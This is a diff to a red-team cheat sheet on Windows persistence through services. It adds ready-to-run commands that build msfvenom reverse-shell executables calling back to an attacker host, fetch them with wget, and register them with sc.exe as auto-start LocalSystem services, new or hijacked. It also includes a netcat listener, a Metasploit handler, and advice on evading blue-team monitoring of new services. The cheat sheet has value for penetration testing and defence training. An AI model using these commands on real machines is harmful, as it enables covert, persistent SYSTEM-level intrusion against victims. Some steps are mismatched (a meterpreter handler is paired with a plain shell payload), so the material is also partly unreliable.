@@ -1,21 +1,57 @@
 Windows Local Persistence techniques using CMD for Red Team Operations
 
-Assign Group Memberships: choose only the best techniques
-Special Privileges and Security Descriptors:
-RID Hijacking:
-Executable Files:
-Shortcut Files:
-Hijacking File Associations:
 Creating backdoor services:
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+                                Create a reverse shell with msfvenom and associate it with the created service
+  python3 -m http.server
+	wget http://<ATTACKER_IP>:8000/rev-svc.exe -O rev-svc.exe
+	move .\rev-svc.exe C:\Windows\rev-svc.exe
+	nc -lvp 4448
+	sc.exe create Service2 binPath= "C:\windows\rev-svc.exe" start= auto
+	sc.exe start Service2
+                                Copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it
+
 Modifying existing services:
-Task Scheduler:
-Making Our Task Invisible:
-Startup folder:
-Run / RunOnce:
-Winlogon:
-Logon scripts:
+  sc.exe query state=all
+                                Get a list of available services
+  sc.exe qc Service3
+                                Find some stopped service called i.e. `Service3` and
+                                Query the service's configuration
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=5558 -f exe-service -o rev-svc2.exe
+                                Start by creating a new reverse shell with msfvenom
+  sc.exe config Service3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+                                Reconfigure "Service3" parameters
+  sc.exe qc Service3
+                                Query the service's configuration again to check if all went as expected
+  msfconsole -q
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set lhost tun0
+  set lport 5558
+  run
+                                Start a Metasploit listener on your attacker's machine
+                                Transport the payload (below instructions)
+  sc.exe start Service3
+                                Manually start the service to receive a reverse shell
+
+Transporting the payload:
+  python3 -m http.server
+	wget http://<ATTACKER_IP>:8000/rev-svc.exe -O rev-svc.exe
+	move .\rev-svc.exe C:\Windows\rev-svc.exe
+	nc -lvp 4448
 
 Informational:
+Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started.
+If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
+There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.
+
+While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. 
+We may want to reuse an existing service instead of creating one to avoid detection.
+
+There are three things we care about when using a service for persistence:
+  The executable (BINARY_PATH_NAME) should point to our payload.
+  The service START_TYPE should be automatic so that the payload runs without user interaction.
+  The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.
 
 Resources:
 Hexacorn - Windows Persistence
